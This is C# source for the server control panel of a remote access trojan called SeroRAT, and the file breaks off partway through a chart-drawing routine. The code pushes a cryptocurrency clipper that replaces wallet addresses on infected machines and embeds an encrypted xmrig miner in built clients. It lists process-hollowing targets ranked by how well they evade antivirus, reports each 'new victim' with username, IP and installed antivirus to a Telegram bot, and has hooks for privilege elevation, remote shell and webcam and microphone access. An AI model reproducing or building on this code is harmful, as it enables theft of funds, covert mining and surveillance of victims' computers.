using System.Collections.ObjectModel;
using System.IO;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Effects;
using System.Windows.Threading;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class ServerWindow : Window
{
    private readonly DataStore _store = new();
    private TlsServer? _server;
    private DateTime _serverStartedAt;
    private readonly DispatcherTimer _dashTimer;
    private readonly DispatcherTimer _uptimeTimer;
    private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
    private Net.SeroDiscordRPC? _discordRpc;
    // BulkObservableCollection: fires one Reset instead of N individual change events.
    // Prevents DataGrid from refreshing N×N times when thousands of clients connect.
    private sealed class BulkObservableCollection<T> : System.Collections.ObjectModel.ObservableCollection<T>
    {
        private bool _bulk;
        public void AddRange(IEnumerable<T> items)
        {
            _bulk = true;
            foreach (var item in items) Items.Add(item);
            _bulk = false;
            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
        }
        public void RemoveRange(IEnumerable<T> items)
        {
            _bulk = true;
            foreach (var item in items) Items.Remove(item);
            _bulk = false;
            OnCollectionChanged(new System.Collections.Specialized.NotifyCollectionChangedEventArgs(System.Collections.Specialized.NotifyCollectionChangedAction.Reset));
        }
        protected override void OnCollectionChanged(System.Collections.Specialized.NotifyCollectionChangedEventArgs e)
        { if (!_bulk) base.OnCollectionChanged(e); }
    }

    private readonly BulkObservableCollection<ConnectedClient> _onlineClients = new();
    // O(1) lookup by ID — mirrors _onlineClients, kept in sync by FlushClientQueue
    private readonly Dictionary<string, ConnectedClient> _onlineById = new();
    // Pending connect/disconnect ops, flushed every 150ms on the UI thread
    private readonly System.Collections.Concurrent.ConcurrentQueue<(bool add, ConnectedClient client)> _clientQueue = new();
    private DispatcherTimer? _batchTimer;

    private volatile bool _clientsDirty = true;
    private volatile bool _autoTasksDirty;
    private int _logLineCount;
    private const int LogMaxLines = 2000;
    private const int LogTrimTo   = 1000;
    private System.Windows.Documents.Paragraph? _logPara;

    // Activity panel — tracks recent operations for the bottom status area
    private readonly List<ActivityEntry> _recentActivity = [];
    private record ActivityEntry(string Action, string Target, string Status, DateTime Time);

    public static void ReportGlobalActivity(string action, string target, string status)
    {
        if (Application.Current?.MainWindow is ServerWindow main)
            main.Dispatcher.BeginInvoke(() => main.AddActivity(action, target, status));
    }

    private void AddActivity(string action, string target, string status)
    {
        var entry = new ActivityEntry(action, target, status, DateTime.Now);
        _recentActivity.Add(entry);
        if (_recentActivity.Count > 10) // Keep ~10 items
            _recentActivity.RemoveAt(0);
        RefreshActivityFeed();
    }
    private static readonly Brush _brushActivityRunning = MakeBrush(0x38, 0xBD, 0xF8); // sky blue
    private static readonly Brush _brushActivityComplete = MakeBrush(0x4A, 0xDE, 0x80); // green
    private static readonly Brush _brushActivityFailed = MakeBrush(0xF8, 0x71, 0x71); // red
    private static readonly Brush _brushActivityUpload = MakeBrush(0xA7, 0x8B, 0xFA); // purple
    private static readonly Brush _brushActivityDownload = MakeBrush(0x34, 0xD3, 0x99); // emerald
    private static readonly Brush _brushActivityRdp = MakeBrush(0xFB, 0xBF, 0x24); // amber
    private static readonly Brush _brushActivityCmd = MakeBrush(0xF4, 0x3F, 0x5E); // rose

    private void SetStatus(string text, string? activityAction = null, string? activityTarget = null, string? activityStatus = null)
    {
        if (TxtStatusBar != null) TxtStatusBar.Text = text;
        if (activityAction != null)
            AddActivity(activityAction, activityTarget ?? "", activityStatus ?? "complete");
    }

    private void RefreshActivityFeed()
    {
        if (ActivityFeedPanel == null) return;
        ActivityFeedPanel.Children.Clear();
        foreach (var a in _recentActivity)
        {
            var isRunning = a.Status == "running";
            var isFailed = a.Status == "failed";
            
            var emoji = "⚡";
            var actionColor = _brushLogDefault;
            
            if (a.Action.Contains("Upload", StringComparison.OrdinalIgnoreCase)) { emoji = "⬆️"; actionColor = _brushActivityUpload; }
            else if (a.Action.Contains("Download", StringComparison.OrdinalIgnoreCase)) { emoji = "⬇️"; actionColor = _brushActivityDownload; }
            else if (a.Action.Contains("desktop", StringComparison.OrdinalIgnoreCase)) { emoji = "🖥️"; actionColor = _brushActivityRdp; }
            else if (a.Action.Contains("Kill", StringComparison.OrdinalIgnoreCase)) { emoji = "💀"; actionColor = _brushActivityCmd; }
            else if (a.Action.Contains("command", StringComparison.OrdinalIgnoreCase)) { emoji = "⌨️"; actionColor = _brushActivityCmd; }

            var icon = isRunning ? "⋯ " : isFailed ? "✗ " : "✓ ";
            var brush = isRunning ? _brushActivityRunning : isFailed ? _brushActivityFailed : _brushActivityComplete;
            
            string timeFmt = (UiPrefs.GetInt("ShowSeconds", 0) == 1) ? "h:mm:ss tt" : "h:mm tt";
            var time = a.Time.ToString(timeFmt);
            
            var tb = new TextBlock 
            { 
                FontFamily = new System.Windows.Media.FontFamily("Consolas"), 
                FontSize = 10,
                Margin = new Thickness(2, 1, 0, 1)
            };
            
            tb.Inlines.Add(new System.Windows.Documents.Run(time + "  ") { Foreground = _brushLogTime });
            tb.Inlines.Add(new System.Windows.Documents.Run(icon) { Foreground = brush });
            tb.Inlines.Add(new System.Windows.Documents.Run(emoji + " " + a.Action + " ") { Foreground = actionColor });
            if (!string.IsNullOrEmpty(a.Target))
                tb.Inlines.Add(new System.Windows.Documents.Run(a.Target) { Foreground = _brushLogIP });

            ActivityFeedPanel.Children.Add(tb);
        }
    }

    private bool _autoScrollActivity = true;
    private void ActivityLogScroll_ScrollChanged(object sender, ScrollChangedEventArgs e)
    {
        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
            _autoScrollActivity = (ActivityLogScroll.VerticalOffset + ActivityLogScroll.ViewportHeight >= ActivityLogScroll.ExtentHeight - 10);

        if (_autoScrollActivity && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
            ActivityLogScroll.ScrollToEnd();
    }

    // Coloured log brushes (frozen = thread-safe, allocated once)
    private static readonly Brush _brushLogError      = MakeBrush(0xF8, 0x71, 0x71); // Soft Coral Red
    private static readonly Brush _brushLogSuccess    = MakeBrush(0x4A, 0xDE, 0x80); // Mint Green
    private static readonly Brush _brushLogConnect    = MakeBrush(0x2D, 0xD4, 0xBF); // Teal/Emerald
    private static readonly Brush _brushLogDisconnect = MakeBrush(0xFB, 0x92, 0x3C); // Warm Orange
    private static readonly Brush _brushLogAdmin      = MakeBrush(0xC0, 0x84, 0xFC); // Lavender Purple
    private static readonly Brush _brushLogTask       = MakeBrush(0x38, 0xBD, 0xF8); // Sky Blue
    private static readonly Brush _brushLogDefault    = MakeBrush(0x94, 0xA3, 0xB8); // Slate Gray
    private static readonly Brush _brushLogTime       = MakeBrush(0x50, 0x58, 0x70); // Dim muted blue-gray for timestamp
    private static readonly Brush _brushLogIP         = MakeBrush(0xF4, 0x72, 0xB6); // Pink for IP addresses
    private static readonly Brush _brushLogGood       = _brushLogSuccess;
    private static readonly Brush _brushLogDll        = _brushLogTask;
    private static Brush MakeBrush(byte r, byte g, byte b)
    {
        var b2 = new SolidColorBrush(Color.FromRgb(r, g, b));
        b2.Freeze();
        return b2;
    }
    private readonly Dictionary<TextBlock, DispatcherTimer> _counterTimers = new();
    private DispatcherTimer? _searchDebounce;
    private readonly Dictionary<string, Window> _featureWindows = new();
    private byte[]? _bldXmrigBytes;
    private string? _bldXmrigPath;
    private byte[]? _bldSfcSeed;   // per-build 32-byte SFC64 seed; encrypts embedded xmrig

    private static byte[] SfcEncode(byte[] data, byte[] seed)
    {
        var out_ = new byte[data.Length];
        ulong a = BitConverter.ToUInt64(seed, 0),  b = BitConverter.ToUInt64(seed, 8),
              c = BitConverter.ToUInt64(seed, 16), d = BitConverter.ToUInt64(seed, 24);
        for (int i = 0; i < data.Length; i++)
        {
            ulong k = a + b + d; d++;
            a = b ^ (b >> 11);
            b = c + (c << 3);
            c = (c << 24) | (c >> 40);
            c += k;
            out_[i] = (byte)(data[i] ^ (byte)k);
        }
        return out_;
    }

    private static string ConfigFilePath
    {
        get
        {
            var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
            Directory.CreateDirectory(dir);
            return Path.Combine(dir, "server_config.json");
        }
    }

    public ServerWindow()
    {
        InitializeComponent();

        try
        {
            var version = System.Reflection.Assembly.GetExecutingAssembly().GetName().Version;
            if (version != null)
                TxtVersionNumber.Text = $" v{version.Major}.{version.Minor}.{version.Build}";
        }
        catch { }

        _dashTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
        _dashTimer.Tick += (_, _) => RefreshDashboard();

        _uptimeTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
        _uptimeTimer.Tick += (_, _) => RefreshUptime();

        // Batch client connect/disconnect UI updates every 150ms
        // This prevents the DataGrid from freezing when thousands of clients connect simultaneously
        _batchTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(150) };
        _batchTimer.Tick += FlushClientQueue;
        _batchTimer.Start();

        Loaded += (_, _) =>
        {
            // Load native icons for context menu items
            var svcPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "services.msc");
            if (ShellIcon.GetFromPath(svcPath) is { } svcIco)
                SvcMgrMenuIcon.Source = svcIco;
            var camIcon = TryLoadCameraIcon();
            if (camIcon != null) CamMenuIcon.Source = camIcon;
            MicMenuIcon.Source = MakeMicIcon();

            // Wrap in CollectionView so we can filter without modifying _onlineClients
            var view = System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients);
            view.Filter = ClientFilter;
            view.SortDescriptions.Add(new System.ComponentModel.SortDescription(
                nameof(Data.ConnectedClient.HasTag), System.ComponentModel.ListSortDirection.Descending));
            GridClients.ItemsSource = view;
            LoadColumnVisibility();
            RestoreGridColumnWidths();
            SetupGridColumnPersistence();
            PopulateColumnVisibilityMenu();
            UpdateSettingsCheckboxStates();

            // Initialise diagnostic logger (enabled by default)
            DiagnosticLogger.Init();
            TxtDevLogsPath.Text = DiagnosticLogger.LogDirectory;

            Log("[*] Server ready. Click START to listen.");
            RefreshAllClients();
            LoadConfig();
            LoadSoundPreferences();
            NotificationService.Initialize(SettingsNotifySound.IsChecked == true);
            // Initialize default host if empty
            if (BldHosts.Items.Count == 0)
                BldHosts.Items.Add("127.0.0.1");
            GridAutoTasks.ItemsSource = _autoTasks;
            InitHollowTargets();

            // First launch: cert + auth key setup
            bool needsCert;
            try
            {
                var certDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
                needsCert = !File.Exists(Path.Combine(certDir, "server.pfx"));
            }
            catch { needsCert = true; }

            if (needsCert)
                ShowCertSetupDialog();

            // Re-check AFTER dialog — importing a .sero may have restored the auth key
            if (string.IsNullOrEmpty(BldAuthKey.Text.Trim()))
            {
                var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(24);
                BldAuthKey.Text = Convert.ToBase64String(bytes);
                SaveConfig();
                Log("[+] Auth key generated and saved.");
            }

            // Always load cert hash
            try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); }
            catch { BldCertHash.Text = "(start server first)"; }

            BinderGrid.ItemsSource = _binderEntries;
        };
    }

    private string GetHollowTarget()
    {
        var text = BldHollowTarget.Text?.Trim() ?? "";
        // If it's a raw process name, return as-is
        if (text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            return text;
        // Extract first word (process name) from display string
        return text.Split(' ', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "svchost.exe";
    }

    private void InitHollowTargets()
    {
        var targets = new (string proc, int score, string note)[]
        {
            ("svchost.exe", 95, "many instances, blends in"),
            ("RuntimeBroker.exe", 90, "runs often, lightweight"),
            ("dllhost.exe", 90, "COM surrogate, common"),
            ("conhost.exe", 85, "console host, normal"),
            ("sihost.exe", 85, "shell infrastructure"),
            ("taskhostw.exe", 85, "task host, expected"),
            ("audiodg.exe", 85, "audio device graph"),
            ("SearchProtocolHost.exe", 80, "Windows Search"),
            ("backgroundTaskHost.exe", 80, "UWP background"),
            ("smartscreen.exe", 80, "Defender, may restart"),
            ("spoolsv.exe", 80, "print spooler service"),
            ("WmiPrvSE.exe", 75, "WMI provider, admin"),
            ("wlanext.exe", 75, "WiFi extensibility"),
            ("dwm.exe", 70, "desktop window manager, risky"),
            ("explorer.exe", 70, "shell, crash = desktop gone"),
            ("notepad.exe", 70, "suspicious if visible"),
            ("msiexec.exe", 60, "installer, short-lived"),
            ("cmd.exe", 55, "suspicious if persistent"),
            ("powershell.exe", 50, "flagged by most AV"),
        };

        BldHollowTarget.Items.Clear();
        foreach (var (proc, score, note) in targets)
        {
            var brush = score >= 85
                ? new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e))
                : score >= 70
                    ? new SolidColorBrush(Color.FromRgb(0xb8, 0x86, 0x0b))
                    : new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            BldHollowTarget.Items.Add(new HollowTargetItem { Proc = proc, Score = $"{score}%", Note = note, ScoreColor = brush });
        }

        BldHollowTarget.SelectionChanged += (_, _) =>
        {
            if (BldHollowTarget.SelectedItem is HollowTargetItem item)
                Dispatcher.BeginInvoke(() => BldHollowTarget.Text = item.Proc);
        };
    }

    public class HollowTargetItem
    {
        public string Proc  { get; set; } = "";
        public override string ToString() => Proc;
        public string Score { get; set; } = "";
        public string Note { get; set; } = "";
        public System.Windows.Media.Brush ScoreColor { get; set; } = System.Windows.Media.Brushes.Black;
    }

    // ── Crypto Clipper (global — applies to all clients) ────────────────────────
    private bool _clipperRunning;
    private int  _clipperCount;

    private ClipperSetConfigData BuildClipperConfig(bool enabled) => new()
    {
        Enabled = enabled,
        Addresses = new ClipperAddresses
        {
            BTC  = ClipperBTC.Text.Trim(),
            ETH  = ClipperETH.Text.Trim(),
            LTC  = ClipperLTC.Text.Trim(),
            TRX  = ClipperTRX.Text.Trim(),
            SOL  = ClipperSOL.Text.Trim(),
            XMR  = ClipperXMR.Text.Trim(),
            XRP  = ClipperXRP.Text.Trim(),
            DASH = ClipperDASH.Text.Trim(),
            BCH  = ClipperBCH.Text.Trim(),
        }
    };

    private async void ClipperStart_Click(object sender, RoutedEventArgs e)
    {
        _clipperRunning = true;
        BtnClipperStart.IsEnabled = false; BtnClipperStart.Opacity = 0.45;
        BtnClipperStop.IsEnabled  = true;  BtnClipperStop.Opacity  = 1.0;
        ClipperActiveBadge.Visibility = Visibility.Visible;
        // Push config to all currently online clients
        if (_server != null)
        {
            var pkt = new Packet
            {
                Type = PacketType.ClipperSetConfig,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(true))
            };
            await _server.SendToAll(pkt);
            Log($"[CLIPPER] Started — config pushed to {_server.ConnectedClients.Count} client(s).");
        }
        SaveConfig();
    }

    private async void ClipperStop_Click(object sender, RoutedEventArgs e)
    {
        _clipperRunning = false;
        BtnClipperStart.IsEnabled = true;  BtnClipperStart.Opacity = 1.0;
        BtnClipperStop.IsEnabled  = false; BtnClipperStop.Opacity  = 0.45;
        ClipperActiveBadge.Visibility = Visibility.Collapsed;
        if (_server != null)
        {
            var pkt = new Packet
            {
                Type = PacketType.ClipperSetConfig,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(BuildClipperConfig(false))
            };
            await _server.SendToAll(pkt);
            Log("[CLIPPER] Stopped — all clients notified.");
        }
    }

    private void ClipperEnabled_Changed(object sender, RoutedEventArgs e) { }

    private void ClipperApply_Click(object sender, RoutedEventArgs e) { }

    private void ClipperSave_Click(object sender, RoutedEventArgs e)
    {
        SaveConfig();
        ClipperCountTxt.Text = "  —  saved";
        System.Threading.Tasks.Task.Delay(1500).ContinueWith(_ =>
            Dispatcher.BeginInvoke(() => {
                if (ClipperCountTxt.Text == "  —  saved")
                    ClipperCountTxt.Text = _clipperCount > 0 ? $"  —  {_clipperCount} replacements" : "";
            }));
    }

    private void ClipperClearLog_Click(object sender, RoutedEventArgs e)
    {
        ClipperLog.Clear();
        _clipperCount = 0;
        ClipperCountTxt.Text = "  —  0 replacements";
    }

    private void HandleClipperDetected(string clientId, Protocol.ClipperDetectedData data)
    {
        _clipperCount++;
        NotificationService.NotifyClipperTriggered();
        var display = clientId.Length > 8 ? clientId[..8] : clientId;
        var line = $"[{DateTime.Now:HH:mm:ss}]  [{display}]  {data.Type}  {data.Original}  →  {data.Replaced}\n";
        ClipperLog.AppendText(line);
        ClipperCountTxt.Text = $"  —  {_clipperCount} replacement{(_clipperCount != 1 ? "s" : "")}";
    }

    private bool _autoScrollClipper = true;
    private void ClipperLogScroll_ScrollChanged(object sender, ScrollChangedEventArgs e)
    {
        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
            _autoScrollClipper = (ClipperLogScroll.VerticalOffset + ClipperLogScroll.ViewportHeight >= ClipperLogScroll.ExtentHeight - 10);

        if (_autoScrollClipper && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
            ClipperLogScroll.ScrollToEnd();
    }

    // ── Server-side Telegram notification (global counter) ──────────────────────
    // Fires when a brand-new HWID connects — uses the server's DataStore count
    // so the number is truly global across all victims, not per-machine.
    private async Task ServerTelegramNotifyAsync(Data.ConnectedClient c)
    {
        try
        {
            var token   = BldTelegramToken.Text.Trim();
            var chatId1 = BldTelegramChatId1.Text.Trim();
            var chatId2 = BldTelegramChatId2.Text.Trim();
            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;

            // Global count = total unique HWIDs the server has ever seen
            int count   = _store.AllClients.Count;
            var admin   = c.IsAdmin ? "Yes" : "No";
            var country = string.IsNullOrEmpty(c.Country) ? "N/A" : c.Country;
            var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
            var paris   = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz)
                              .ToString("yyyy-MM-dd HH:mm") + " (Paris)";

            var msg =
                $"New victim {TgOrdinal(count)} - SeroRAT\n\n" +
                $"ID: {c.Id}\n" +
                $"User: {c.Username}@{c.MachineName}\n" +
                $"IP: {c.IP}\n" +
                $"Country: {country}\n" +
                $"CPU: {c.CpuName}\n" +
                $"OS: {c.OS}\n" +
                $"Admin: {admin}\n" +
                $"AV: {c.Antivirus}\n" +
                $"Time: {paris}";

            using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(10) };
            var targets = new List<string> { chatId1 };
            if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

            foreach (var id in targets)
            {
                try
                {
                    var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                              $"?chat_id={Uri.EscapeDataString(id)}" +
                              $"&text={Uri.EscapeDataString(msg)}";
                    await http.GetAsync(url);
                }
                catch { }
            }
        }
        catch { }
    }

    private static string TgOrdinal(int n)
    {
        string suffix = (n % 100) switch
        {
            11 or 12 or 13 => "th",
            _ => (n % 10) switch { 1 => "st", 2 => "nd", 3 => "rd", _ => "th" }
        };
        return $"{n}{suffix}";
    }

    // ── Server Control ──────────────────────────────

    private void StartStop_Click(object sender, RoutedEventArgs e)
    {
        if (_server is { IsRunning: true })
        {
            NotificationService.PlayShutdown();
            _server.Stop();
            _dashTimer.Stop();
            _uptimeTimer.Stop();
            _discordRpc?.Stop();
            _discordRpc = null;
            TxtPort.IsEnabled = true;
            SetServerStatus(false);
            BtnStartStop.Content = "START";
            BtnStartStop.Style = (Style)FindResource("SGreenBtn");
            _server = null;
            while (_clientQueue.TryDequeue(out _)) { }  // drain pending ops
            _onlineClients.Clear();
            _onlineById.Clear();
            UpdateClientCount();
            ScreenPanel.Children.Clear();
            _screenTiles.Clear();
            // Status is now handled by the Activity Panel
            Log("[*] Server stopped.");
        }
        else
        {
            if (!int.TryParse(TxtPort.Text, out int port) || port < 1 || port > 65535)
            {
                Log("[!] Invalid port.");
                return;
            }

            SaveConfig();

            try
            {
                _server = new TlsServer(_store);
                _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
                _server.ClientConnected += c =>
                {
                    DiagnosticLogger.ClientConnect(c.Id, c.IP, c.Username, c.OS);
                    // UI update is batched — enqueue and let _batchTimer flush at 150ms intervals
                    _clientQueue.Enqueue((true, c));

                    // Side effects: run on thread pool, read UI state via Dispatcher.Invoke
                    _ = Task.Run(async () =>
                    {
                        bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
                                         || rec.ActivityLog.Count <= 1;
                        NotificationService.NotifyConnected(c.Id, isNewHwid);

                        if (_autoTasks.Count > 0)
                            await ExecuteAutoTasksForClient(c);

                        bool telegramEnabled = Dispatcher.Invoke(() => BldTelegramEnabled.IsChecked == true);
                        if (isNewHwid && telegramEnabled)
                            _ = ServerTelegramNotifyAsync(c);

                        if (_clipperRunning && _server != null)
                            await _server.SendToClient(c.Id, new Packet
                            {
                                Type = PacketType.ClipperSetConfig,
                                Data = Newtonsoft.Json.JsonConvert.SerializeObject(
                                    Dispatcher.Invoke(() => BuildClipperConfig(true)))
                            });
                    });
                };
                _server.ClientDisconnected += c =>
                {
                    DiagnosticLogger.ClientDisconnect(c.Id, "TCP session closed");
                    NotificationService.NotifyDisconnected(c.Id);
                    // UI update batched — feature window closing handled in FlushClientQueue
                    _clientQueue.Enqueue((false, c));
                };
                _server.ElevationResultReceived += (clientId, data) => Dispatcher.Invoke(() =>
                {
                    var status = data.Success ? "ELEVATED" : "FAILED";
                    Log($"[UAC] Client {clientId}: {status} - {data.Message}");
                    if (data.Success) RefreshClients();
                });

                // Crypto Clipper detections → global Clipper tab log
                _server.ClipperDetectedReceived += (clientId, data) =>
                    Dispatcher.BeginInvoke(() => HandleClipperDetected(clientId, data));

                // Log autotask shell output separately (not routed to RemoteShellWindow)
                _server.AutoTaskShellOutputReceived += (clientId, output) => Dispatcher.BeginInvoke(() =>
                {
                    if (string.IsNullOrWhiteSpace(output)) return;
                    var display = clientId.Length > 8 ? clientId[..8] : clientId;
                    foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
                        Log($"[AT:{display}] {line.TrimEnd('\r')}");
                });

                // Set auth key, client ID prefix, and max clients
                var authKey = BldAuthKey.Text.Trim();
                if (string.IsNullOrEmpty(authKey))
                {
                    Log("[!] Auth key is required. Generate one in the Builder tab first.");
                    return;
                }
                _server.AuthKey = authKey;
                _server.GetClientIdPrefix = () => Dispatcher.Invoke(() => BldClientIdPrefix.Text.Trim());
                if (int.TryParse(SettingsMaxClients.Text, out int maxClients) && maxClients > 0)
                    _server.MaxConnectedClients = maxClients;
                _server.Start(port);
                NotificationService.PlayStartup();
                _serverStartedAt = DateTime.UtcNow;
                TxtPort.IsEnabled = false;
                SetServerStatus(true);
                BtnStartStop.Content = "STOP";
                BtnStartStop.Style = (Style)FindResource("SRedBtn");
                _dashTimer.Start();
                _uptimeTimer.Start();
                // Status is now handled by the Activity Panel

                // Discord RPC
                if (SettingsDiscordRPC.IsChecked == true)
                {
                    try
                    {
                        _discordRpc = new Net.SeroDiscordRPC();
                        _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Log($"[!] Failed to start: {ex.Message}");
            }
        }
    }

    private void SetServerStatus(bool running)
    {
        var brush = running
            ? (Brush)FindResource("GreenBrush")
            : (Brush)FindResource("RedBrush");

        ServerDot.Fill = brush;
        TxtServerStatus.Text = running ? "Listening" : "Not Listening";
    }

    private void UpdateClientCount()
    {
        var count = _server?.ConnectedClients.Count ?? 0;
        TxtClientCount.Text = $"  |  {count} client{(count != 1 ? "s" : "")}";
    }

    // Flush queued connect/disconnect operations in a single batch → one CollectionChanged (Reset)
    private void FlushClientQueue(object? s, EventArgs e)
    {
        if (_clientQueue.IsEmpty) return;

        var toAdd    = new List<ConnectedClient>();
        var toRemove = new List<ConnectedClient>();
        var toClose  = new List<string>();  // client IDs whose feature windows must close

        while (_clientQueue.TryDequeue(out var op))
        {
            if (op.add)
            {
                if (!_onlineById.ContainsKey(op.client.Id))
                    toAdd.Add(op.client);
            }
            else
            {
                if (_onlineById.ContainsKey(op.client.Id))
                {
                    toRemove.Add(op.client);
                    toClose.Add(op.client.Id); // only close windows for clients that were visible
                }
            }
        }

        if (toRemove.Count > 0)
        {
            foreach (var c in toRemove) _onlineById.Remove(c.Id);
            _onlineClients.RemoveRange(toRemove);
        }
        if (toAdd.Count > 0)
        {
            foreach (var c in toAdd) _onlineById[c.Id] = c;
            _onlineClients.AddRange(toAdd);
        }

        // Close feature windows + remove screen tiles for disconnected clients
        foreach (var id in toClose)
        {
            var prefix = id + ":";
            var keys   = _featureWindows.Keys.Where(k => k.StartsWith(prefix, StringComparison.Ordinal)).ToList();
            foreach (var k in keys)
            {
                try { _featureWindows[k].Close(); } catch { }
            }

            // Remove screen tile immediately (don't wait for next RequestScreenshots tick)
            if (_screenBorders.TryGetValue(id, out var tb))
            {
                if (id == _focusedScreenId) ClearScreenFocus();
                ScreenPanel.Children.Remove(tb);
                _screenBorders.Remove(id);
                _screenTiles.Remove(id);
                // Also close popup if it was showing this client's screenshot
                if (ScreenPopupOverlay.Visibility == Visibility.Visible
                    && ScreenPopupSub.Text == id)
                    ScreenPopupOverlay.Visibility = Visibility.Collapsed;
            }
        }

        if (toAdd.Count > 0 || toRemove.Count > 0)
        {
            _clientsDirty = true;
            UpdateClientCount();
        }
    }

    private void RefreshClients()
    {
        if (_server == null) return;
        // O(n) sync using the dictionary — safe for 100k clients
        var current = _server.ConnectedClients;

        // Remove stale (O(n))
        var toRemove = _onlineClients.Where(c => !current.ContainsKey(c.Id)).ToList();
        if (toRemove.Count > 0)
        {
            foreach (var c in toRemove) _onlineById.Remove(c.Id);
            _onlineClients.RemoveRange(toRemove);
        }

        // Add missing (O(n))
        var toAdd = current.Values.Where(c => !_onlineById.ContainsKey(c.Id)).ToList();
        if (toAdd.Count > 0)
        {
            foreach (var c in toAdd) _onlineById[c.Id] = c;
            _onlineClients.AddRange(toAdd);
        }
    }

    private void RefreshAllClients()
    {
        int currentPort = _server?.Port ?? 0;
        var clients = _store.AllClients.Values
            .Where(r => currentPort == 0 || r.LastPort == 0 || r.LastPort == currentPort)
            .OrderByDescending(r => r.HasTag)
            .ThenByDescending(r => r.LastSeen);
        GridAllClients.ItemsSource = null;
        GridAllClients.ItemsSource = new ObservableCollection<ClientRecord>(clients);
        if (TxtAllClientsCount != null)
            TxtAllClientsCount.Text = $"{_store.AllClients.Count} records";
    }

    private void ClearOfflineClients_Click(object s, RoutedEventArgs e)
    {
        if (_server == null) return;
        var onlineHwids = _server.ConnectedClients.Values
            .Select(c => c.Hwid).ToHashSet(StringComparer.OrdinalIgnoreCase);
        var toRemove = _store.AllClients.Keys
            .Where(hwid => !onlineHwids.Contains(hwid)).ToList();
        foreach (var k in toRemove)
            _store.AllClients.TryRemove(k, out _);
        _store.Save();
        RefreshAllClients();
        Log($"[*] Cleared {toRemove.Count} offline client record(s).");
    }

    private void RefreshUptime()
    {
        var uptime = DateTime.UtcNow - _serverStartedAt;
        DashUptime.Text = uptime.TotalHours >= 1
            ? $"{(int)uptime.TotalHours}h {uptime.Minutes}m {uptime.Seconds:D2}s"
            : $"{uptime.Minutes}m {uptime.Seconds:D2}s";
    }

    // ── Screenshot popup overlay ──────────────────────────────────────────
    private void ScreenPopupOverlay_Close(object sender, System.Windows.Input.MouseButtonEventArgs e)
        => ScreenPopupOverlay.Visibility = Visibility.Collapsed;

    private void ScreenPopupOverlay_CloseBtn(object sender, RoutedEventArgs e)
        => ScreenPopupOverlay.Visibility = Visibility.Collapsed;

    private void ScreenPopupOverlay_StopBubble(object sender, System.Windows.Input.MouseButtonEventArgs e)
        => e.Handled = true; // prevent click on the card from dismissing the overlay

    private void DashChart_SizeChanged(object sender, SizeChangedEventArgs e) => DrawActivityChart();

    private void DrawActivityChart()
    {
        double w = DashChart.ActualWidth;
        double h = DashChart.ActualHeight;
        if (w <= 0 || h <= 0) return;

        // Build 24 hourly buckets from AllClients activity logs
        var now    = DateTime.UtcNow;
        var counts = new int[24];
        foreach (var rec in _store.AllClients.Values)
        {
            lock (rec.ActivityLog)
            {
                foreach (var e in rec.ActivityLog)
                {
                    var age = (now - e.Time).TotalHours;
                    if (age < 0 || age >= 24) continue;
                    if (e.Action.StartsWith("Connected", StringComparison.OrdinalIgnoreCase))
                        counts[23 - (int)age]++;
                }
            }
        }

        int peak = Math.Max(1, counts.Max());
        DashPeak.Text = counts.Max() == 0 ? "—" : counts.Max().ToString();

        // Remove previous dynamic children (keep Polyline and Polygon which are declared in XAML)
        for (int i = DashChart.Children.Count - 1; i >= 0; i--)
        {
            var child = DashChart.Children[i];
            if (child is System.Windows.Shapes.Line || child is TextBlock) DashChart.Children.RemoveAt(i);
        }

        // Horizontal grid lines
        var gridBrush = new SolidColorBrush(Color.FromArgb(0x18, 0x4A, 0x85, 0xF5));
        for (int g = 1; g <= 3; g++)
        {
            double y = h * g / 4.0;
            var gl = new System.Windows.Shapes.Line
            {
                X1 = 0, X2 = w, Y1 = y, Y2 = y,
                Stroke = gridBrush, StrokeThickness = 1,
            };
            DashChart.Children.Add(gl);
        }

        // Build point collection
        double padL = 4, padR = 4, padT = 8, padB = 20;
        double chartW = w - padL - padR;
        double chartH = h - padT - padB;
        double step   = chartW / 23.0;

        var linePoints = new System.Windows.Media.PointCollection();
        var fillPoints = new System.Windows.Media.PointCollection();

        for (int i = 0; i < 24; i++)
        {
            double x = padL + i * step;
            double y = padT + chartH - (counts[i] / (double)peak) * chartH;
